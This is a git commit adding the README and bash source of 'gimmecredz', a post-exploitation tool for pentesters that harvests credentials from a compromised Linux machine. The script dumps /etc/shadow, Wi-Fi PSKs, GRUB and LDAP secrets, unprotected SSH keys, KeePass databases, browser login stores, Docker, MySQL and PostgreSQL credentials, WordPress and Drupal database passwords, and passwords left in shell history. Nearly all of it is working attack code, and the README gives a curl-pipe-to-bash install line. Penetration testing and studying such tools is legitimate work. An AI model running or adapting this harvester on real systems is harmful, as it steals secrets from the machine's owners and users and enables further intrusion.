98784cf93bb9b890e1aa0e6d26d5c3bc04628eeb
0xMitsurugi <reversex86@gmail.com>
2018-09-26 17:42:53 +0200

    Initial commit. Fonctional version, although incomplete

--- README.md
+++ README.md
@@ -1,1 +1,110 @@
-# gimmecredz
+You are a pentester, and you totally pwn that linux box (desktop, laptop, server, whatever). Now, what? You can read a lot of files, config files, history and so on in order to find something smelly. That could be time consuming, boring, or long. I decided to write a tool to automatize credentials picking on a pwned box.
+
+# Objective
+This tool can help pentesters to quickly dump all credz from known location, such as .bash_history, config files, wordpress credentials, and so on...
+This is not a hacking tool, just a collection of well-known files with password in them.
+The password can be in clear, base64 or enciphered form. It's up to the pentester to use them, decode them or change them.
+This tool can be launch by root or any users, it will autodetect file access and adapt accordingly.
+
+# Goals
+ - this tool is in bash because bash is everywhere, and I wanted it to be the most compatible with all pwned systems without having to install any third party lib/shell/script language.
+ - this tool should be easy to read/tweak and easy to add new password dumps
+ - this tool should not be taken too seriously
+ - this tool uses mainly bash with a little bit of grep (egrep), find and some other usual tools.
+ - I don't care if this tool fails softly on one or another files. I prefer a simple tool with little fails than an heavier tool bloated with failchecks and sanity verification.
+ - this tool should work quick, for this reason I don't want some hasardous find, such as: `find / -type f -exec grep password {} \;` find is limited with maxdepth 3 at most
+ - this tool should be autodocumented. Read it.
+ - this tool is not sponsored by the NSA and won't send your credz to any thirdparty.
+
+# Usage
+Easy usage:
+```bash
+wget https://raw.githubusercontent.com/0xmitsurugi/gimmecredz/master/gimmecredz.sh
+chmod +x gimmecredz.sh
+./gimmecredz.sh
+```
+Or, for the l33t:
+```bash
+$ curl https://raw.githubusercontent.com/0xmitsurugi/gimmecredz/master/gimmecredz.sh | bash
+```
+Check the start of the script. You can set vars. Currently, you can force to check root-owned files even if you are user (in hope of misconfiguration of the targets). You can also put script in verbose where it show everything, even failures.
+
+# Future devs
+ - adding more files, moar, moar!! The moar, the better!
+ - adding the ability to save any found file. You launch script, you get a tarball with all of the juicy files in it. (see the TAR variable)
+
+# Screenshots (everybody loves screenshots!)
+![Awesome tool](screenshot1.png)
+
+# Key extraction:
+Except for "root access", all files are check. If it's related to /home and if you're root, it will loop for all users.
+
+## Root access
+ - shadow file if we have a bash shell
+ - WPA password store in wpa_supplicant or NetworkManager
+ - grub password
+ - ldap password
+ - All other checks are done for root, and for 
+
+## Files with credz
+ - .docker/config.json
+ - mysql mycnf
+ - pidgin (libpurple)
+ - postgresql
+ - mysql and rdesktop pass stored in .bash_history
+ - ssh keys (protected by pass, and unprotected)
+ - keepassx databases (ability to tell if it's currently open)
+
+## Browsers
+ - Firefox logins.json and key3.db
+ - Chrome Login data
+
+## Webapps
+ - wordpress credz
+ - drupal credz
+
+## More to come:
+I want to add databases, tomcat passwords, better .bash_history parsing, and any other file of interest which contains passwords and which can be accessed reliably. If you have any idea/improvement, share it.
+
+# FAQ
+##### You forgot to check this file or this directory
+Make a pull request, send me an email, ping me on twitter, I'll add it
+
+##### Can you change something here or here in the script?
+Make a pull request, send me an email, ping me on twitter, I'll add it
+
+##### Your tool fails to extract a password
+Make a pull request, send me an email, ping me on twitter, I'll add it (the more files, the better)
+
+##### I've found a bug!
+Make a pull request, send me an email, ping me on twitter, I'll add it
+
+##### I love you and I want to marry you
+Make a pull request, send me an^W^W^W Wait, WHAT?
+
+##### Does it have a license?
+BeerWare. If you're happy to use it, ping me :)
+
+##### There is no configure or make?
+Dude, this is pure bash
+
+##### Is it compatible with blockchain?
+LMAO!! Nope.
+
+##### No really?
+This is in my roadmap, I'll code it in v42.193.254-patchlevelGoldEdition-EditorFinalCut. Reservation needed, ICO in 3 months, It'll cost only 25k$ for you.
+
+##### But this look like Lazagne which is a tool designed to extract password?
+Yes. and [Lazagne](https://github.com/AlessandroZ/LaZagne) is a really great tool. Use it with my blessings. And [pupy] (https://github.com/n1nj4sec/pupy/) too. I'm a happy user of both :)
+
+##### Does P=NP?
+I have a beautiful demonstration of this theorem, but it doesn't fit on ~~this margin~~. ~~this github~~. this internet. 
+
+##### This is not secure code
+We are speaking of pwned system, so what? This is designed for pentesters, and they should know what they do.
+
+##### I've tested it and now, everybody have seen my password on the screen!
+Is your password hunter2?
+
+# Thanks
+thanks for @HexpressoCTF for inspirational IRC talk :)
---
+++ gimmecredz.sh
@@ -0,0 +1,443 @@
+#! /bin/bash
+# If there is a will, there is a way
+#                        0xMitsurugi
+# v0.0.3
+
+############## Credz dumper ##############################
+# This script will try to grab all stored password/secrets
+# on a linux box.
+
+# Defaults vars
+ROOT=0    #If set to 1, we'll try to get files usually owned by root
+          #will produce errors, but could eventually get some things
+TAR=0     #should we copy and save files for later use 0: no, 1: yes
+          #under planning
+VERBOSE=0 #should we print failed checks? 1 yes, 0 no
+
+##########################################################
+# dumping functions
+
+_grep_file() {
+	#if we are root, loop, else do it for current user only
+	# $1 name of check
+	# $2 file to check
+	# $3 pattern to grep
+	name="$1"
+	file="$2"
+	pattern="$3"
+	ROOT=$(_check_root)
+	if [ $ROOT == "yes" ]; then
+        	for userhome in $(grep /bin/bash /etc/passwd | cut -d ":" -f6 )
+		        do
+			        _grep_file_user "$name" "$userhome" "$file" "$pattern"
+			done
+	else
+		_grep_file_user "$name" $HOME "$file" "$pattern"
+	fi
+}
+
+_dump_wifi_wpa_supplicant() {
+	#Check if there are some WPA password saved in wpa_supplicant.conf
+	#First, find conf file, if there are many, try each of them
+	#Second, extract password
+	CONF_FILE=''
+	#[ -r /etc/wpa_supplicant/wpa_supplicant.conf ] && _grep_file_user "WPA SUPPLICANT" "/etc/wpa_supplicant" "wpa_supplicant.conf" "-B6 password"
+	for conffile in /etc/wpa_supplicant.d/*conf /etc/wpa_supplicant/*.conf /etc/wpa_supplicant.conf
+	do
+		_grep_file_user "WPA SUPPLICANT" "" "$conffile" "-B6 psk="
+	done
+
+
+}
+
+_dump_wifi_wpa_nm() {
+	#Spits any saved psk with SSID
+	#If directory doesn't exist, get out
+	[ -d /etc/NetworkManager/system-connections/ ] || return
+	unset DATA
+	OLDIFS=$IFS
+	IFS=$'\n'
+	DATA=$(find /etc/NetworkManager/system-connections -type f )
+	if [ ${#DATA} -gt 1 ]; then
+		for ssid in $DATA
+		do
+			if grep -q psk= $ssid; then
+				_dump_name "WPA PSK saved in NetworkManager"
+				_print_win "$ssid" "$(grep "psk=" "$ssid")"
+			fi
+		done
+	else
+		[ $VERBOSE -eq 1 ] && _dump_name "WPA PSK saved in NetworkManager"
+		_print_lose "/etc/NetworkManager/system-connections/*" "No PSK saved nor files"
+	fi
+	IFS=$OLDIFS
+}
+
+_dump_grub() {
+	#Sometimes, grub have a password
+	if [ -r /etc/grub/grub.cfg ]; then
+		#I'm reusing the _grep_file_user function because it's convenient
+		_grep_file_user "GRUB password" "/etc/grub" "grub.cfg" "password"
+	fi
+	#Some distros use another scheme (debian)
+	if [ -d /etc/grub.d/ ]; then
+		#Sometimes password is in one of those multiples files
+		_grep_file_user "GRUB password" "/etc/grub.d" "." "-r password"
+	fi
+}
+
+_dump_ldap() {
+	#Sometimes, a linux box is binded to an LDAP
+	for secrets in libnss-ldap.secret ldap.secret pam_ldap.secret
+	do
+		if [ -r /etc/${secrets} ]; then
+			_grep_file_user "LDAP password" "/etc" "${secrets}" "-v '^$'"
+		fi
+	done
+}
+
+_grep_file_user() {
+	# $1 name
+	# $2 home
+	# $3 file
+	# $4 pattern
+	name=$1
+	home=$2
+	file=$3
+	pattern=$4
+	#_dump_name "$name credz [$home]"
+	if [ -r ${home}/${file} ]; then
+		grep -q $pattern ${home}/${file}
+		SOMETHING=$?
+		DATA=$(grep $pattern ${home}/${file})
+		if [ $SOMETHING -eq 1 ]; then
+		       echo -n ""
+	        else
+		       _dump_name "$name credz [$home]"
+		       _print_win "${home}/${file}" "$DATA"
+	        fi
+	else
+		[ $VERBOSE -eq 1 ] && _dump_name "$name credz [$home]"
+		_print_lose "${home}/${file}" "no access to file"
+	fi
+}
+
+_dump_shadow() {
+	#If we are root, dump shadow file
+	#and start preheating of crackingStation-128CPU
+	ROOT=$(_check_root)
+	if [ $ROOT == "yes" ];then
+		_dump_name "Interesting data in shadow file"
+		DATA=$(egrep -v ":\*:|:\!\:" /etc/shadow)
+		_print_win "/etc/shadow" "$DATA"
+	fi
+}
+
+_dump_chrome_user() {
+	#Try to locate file with login details
+	#It should contains login in clear and pass in (clear? ciphered? Don't know)
+	#$1 is home dir
+	if [ -r $1/.config/google-chrome/Default/Login\ Data ]; then
+		_dump_name "Google Chrome login details"
+		_print_win "$1/.config/google-chrome/Default/Login\ Data" "Check this file, it may contains credz"
+	fi
+}
+
+_dump_firefox_user() {
+	#Try to find some logins.json files, might contain juicy info
+	#We don't decrypt them, that's to [hard|long] in pure bash
+	#if you want passwd, get them and use any programs which do the job
+	# See : https://support.mozilla.org/fr/questions/1154032 or google "firefox decrypt password key3.db"
+	#$1 is home dir
+	home=$1
+	#this regexp avoids the profiles.ini file
+	for d in $1/.mozilla/firefox/????????.????*
+	do
+		if [ -r "$d"/key3.db -a -r "$d"/logins.json ]; then
+			_dump_name "firefox logins.json and key3.db file"
+			_print_win "$d/logins.json" "Check this file, it have credz inside"
+			_print_win "$d/key3.db" "This file have the key to open logins.json"
+		fi
+	done
+}
+
+_loop_users() {
+	#$1 is the name of the function
+	if [ $(_check_root) == "yes" ]; then
+		#Is it a good check? user with bash shell?
+		for userhome in $(grep /bin/bash /etc/passwd | cut -d ":" -f6 )
+		do
+			$1 "$userhome"
+		done
+	else
+		$1 $HOME
+	fi
+}
+
+_dump_ssh_keys() {
+	#We need to find ssh keys, and unprotected ssh keys
+	#$1 is home dir
+	home=$1
+	if [ -d $home/.ssh ]; then
+		OLDIFS=$IFS
+		IFS=$'\n'
+		SSHKEYFILE=$(find $home/.ssh/ -type f)
+		for f in $SSHKEYFILE
+		do
+			if grep -q "BEGIN RSA" $f; then
+				if grep -q "ENCRYPTED" $f; then
+					[ $VERBOSE -eq 1 ] && _dump_name "SSH Keys"
+					_print_lose "$f" "ssh key protected with passphrase"
+				else
+					_dump_name "SSH Keys"
+					_print_win "$f" "ssh key without protection"
+				fi
+			fi
+		done
+		IFS=$OLDIFS
+	else
+		_print_lose "$home" "No .ssh directory"
+	fi
+
+}
+
+_dump_keepassx() {
+	#We try to find keepass .kdb and .kdbx files
+	#We use find command, and we fail fast (maxdepth=3) to avoid infinite directories
+	#$1 is home dir
+	home=$1
+	OLDIFS=$IFS
+	IFS=$'\n'
+	KEEPASSX=$(find "$home" -maxdepth 3 -iname "*.kdb?")
+	if [ ${#KEEPASSX} -gt 1 ]; then
+		_dump_name "keepassx file"
+		#What if we have space in names?
+		for f in $KEEPASSX
+		do
+			if [ -f $(dirname ${f})"/."$(basename ${f})".lock" ]; then
+				#If keepass is running, U can try to dump memory and search for master pw..
+				_print_win "$f" "Keepassx database open? (lock file found)"
+			else
+				_print_win "$f" "Keepassx database"
+			fi
+		done
+	else
+		[ $VERBOSE -eq 1 ] && _dump_name "keepassx file"
+		_print_lose "$home" "No keepassx file found (no *.kdb?)"
+	fi
+	IFS=$OLDIFS
+}
+
+_dump_wordpress() {
+	#Webapps are a little weird. I don't make any assumptions such as userid
+	#Let try with anybody, and if we find a file, let's rock
+	#First, find WebRoot (apache? nginx? others?)
+	#Second, find wp-config.php and grep it!
+	if [ -d /etc/apache2/sites-available/ ]; then
+		for site in /etc/apache2/sites-available/*
+		do
+			#This regex avoids comments
+			#Are we sure we have one and only one DocumentRoot in conf file?
+			DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
+			OLDIFS=$IFS
+			IFS=$'\n'
+			WPCONF=$(find $DOCROOT -maxdepth 3 -name "wp-config.php*")
+			if [ ${#WPCONF} -gt 1 ]; then
+				#Sometimes we have other credz in wp-config.php such as ftp?
+				for wpconf in $WPCONF
+				do
+					CREDZ=$(grep -B4 -A1 DB_PASSWORD $wpconf)
+					_dump_name "Wordpress config file"
+					_print_win "$wpconf" "$CREDZ"
+				done
+			else
+				[ $VERBOSE -eq 1 ] && _dump_name "Wordpress config file"
+				_print_lose "$DOCROOT" "No wordpress wp-config.php found"
+			fi
+			IFS=$OLDIFS
+		done
+	fi
+
+}
+
+_dump_drupal() {
+	#And now drupal
+	#Maybe use same code with wordpress?
+        if [ -d /etc/apache2/sites-available/ ]; then
+                for site in /etc/apache2/sites-available/*
+                do
+                        #This regex avoids comments
+                        #Are we sure we have one and only one DocumentRoot in conf file?
+                        DOCROOT=$(grep 'DocumentRoot /' $site | grep -E -v "\w*#" | cut -d ' ' -f2)
+			OLDIFS=$IFS
+			IFS=$'\n'
+                        DRUPALCONF=$(find $DOCROOT/ -maxdepth 5 -name "settings.php*")
+                        if [ ${#DRUPALCONF} -gt 1 ]; then
+				for drupalconf in $DRUPALCONF
+				do
+	                                #Sometimes we have other credz in settings.php?
+        	                        CREDZ=$(grep -E -v "\w*\*" $drupalconf | grep -B4 -A1 "password' =>" )
+					if [ ${#CREDZ} -gt 1 ]; then
+		                                _dump_name "Drupal config file"
+		                                _print_win "$drupalconf" "$CREDZ"
+					fi
+				done
+                        else
+                                [ $VERBOSE -eq 1 ] && _dump_name "Drupal config file"
+                                _print_lose "$DOCROOT" "No drupal settings.php found"
+                        fi
+			IFS=$OLDIFS
+                done
+        fi
+
+}
+
+##########################################################
+# internal functions
+RESTORE=$(echo -en '\033[0m')
+RED=$(echo -en '\033[00;31m')
+GREEN=$(echo -en '\033[00;32m')
+YELLOW=$(echo -en '\033[00;33m')
+BLUE=$(echo -en '\033[00;34m')
+MAGENTA=$(echo -en '\033[00;35m')
+PURPLE=$(echo -en '\033[00;35m')
+CYAN=$(echo -en '\033[00;36m')
+LIGHTGRAY=$(echo -en '\033[00;37m')
+LRED=$(echo -en '\033[01;31m')
+LGREEN=$(echo -en '\033[01;32m')
+LYELLOW=$(echo -en '\033[01;33m')
+LBLUE=$(echo -en '\033[01;34m')
+LMAGENTA=$(echo -en '\033[01;35m')
+LPURPLE=$(echo -en '\033[01;35m')
+LCYAN=$(echo -en '\033[01;36m')
+WHITE=$(echo -en '\033[01;37m')
+
+_banner () {
+	echo ${RED}"#####################################################"${RESTORE}
+	echo ${RED}"#"${RESTORE}"                  Gimme credz !!!"
+	echo ${RED}"#####################################################"${RESTORE}
+	#echo "One-file bash-only script"
+	#echo "Harvest all known credz at once"
+	#echo
+	echo ${RED}"#"${RESTORE}"                              The name's 0xMitsurugi"
+	echo ${RED}"#"${RESTORE}"                                        Remember it!"
+	echo ${RED}"#####################################################"${RESTORE}
+}
+
+_dump_name() {
+	h=$(echo $1 | md5sum | cut -d " " -f1)
+	echo
+	echo ${GREEN}"***** "${RESTORE}${1}" "${GREEN}"***** "${RESTORE}
+	#echo ${GREEN}"#################"${RESTORE} $1 ${GREEN}"###########################"${RESTORE}
+	echo
+}
+
+_check_root() {
+	if [ "$ROOT" == "1" ]; then
+		#We pretend to be root to make checks
+		echo "yes"
+	else
+		#otherwise, check for real
+		if [[ $EUID -ne 0 ]]; then
+			echo "no"
+		else
+			echo "yes"
+		fi
+	fi
+}
+
+_print_win() {
+	#$1 : file containing secret
+	#$2 : secret
+	echo ${GREEN}"[+] GOT ONE!!"${RESTORE}
+	#realpath would provide good path, but fail because $1 is not always a file.
+	echo ${LBLUE}"File: "${RESTORE} $(realpath "$1")
+	#echo ${LBLUE}"File: "${RESTORE} "$1"
+	echo "$2"
+
+}
+
+_print_lose() {
+	#$1 : file containing secret
+	#$2 : lose message
+	if [ $VERBOSE -eq 1 ]; then
+		echo ${RED}"[ ] NOPE"
+		echo ${LBLUE}"File: "${RESTORE} "$1"
+		echo "$2"
+	fi
+}
+
+_echo_error() {
+	echo ${RED}"[!] Error"$RESTORE
+	echo "$1"
+
+}
+
+_paragraph() {
+	echo
+	echo ${RED}"#################"${RESTORE} $1 ${RED}"###########################"${RESTORE}
+}
+
+##########################################################
+# Main loop
+
+_banner
+#Are we saving everything?
+#if [ $TAR -eq 1 ]; then
+#	if [ -d TAR/ ]; then
+#		_echo_error "TAR/ exists. Disabling output"
+#		TAR=0
+#	else
+#		mkdir TAR/
+#	fi
+#fi
+
+###################### If we are root, then get kingdom keys
+# see the comment in _check_root if U want to try anyway those checks
+#Start dump!!
+if [ $(_check_root) == "yes" ]; then
+	_paragraph "ROOT ACCESS!"
+	_dump_shadow
+	_dump_wifi_wpa_nm
+	_dump_wifi_wpa_supplicant
+	_dump_grub
+	_dump_ldap
+	#Should we dump LUKS key? For what usage if we are in pentest?
+	# in case you need it -> dmsetup table --showkeys crypto
+fi
+
+###################### Have fun with credz stored in files
+_paragraph "FILES!"
+#Documentation:
+#_grep_file "Name of check" "Filepath (related to $HOME/) "grep pattern"
+_grep_file ".docker/config.json" ".docker/config.json" "-B1 auth\":"
+_grep_file "mysql_my_cnf" ".my.cnf" "-B1 password"
+_grep_file "pidgin (libpurple)" ".purple/accounts.xml" "-B1 password"
+_grep_file "postgreSQL" ".pgpass" ":"
+_grep_file "mysql pass in CLI history" ".bash_history" "-E mysql.*-p"
+_grep_file "rdesktop pass in CLI history" ".bash_history" "-E rdesktop.*-p "
+#Always interesting to look there
+_loop_users _dump_ssh_keys
+#Keepass database are good targets
+_loop_users _dump_keepassx
+
+######################### And now, browsers
+_paragraph "BROWSERS!"
+_loop_users _dump_firefox_user
+_loop_users _dump_chrome_user
+#old browsers? such as Konqueror?
+
+
+############################# Play with webapps!
+#Find tomcat home, dump admin pass 
+#How to find tomcat home reliably???
+_paragraph "WEB APPS!"
+_dump_wordpress
+_dump_drupal
+#Add Directory Alias apache config?
+#if we found locatedb, should we use it?
+#.yml files (symphony) => credz config.yml or parameters.yml
+
+#Databases
+#find mysql file, postgresql file, etc..
+
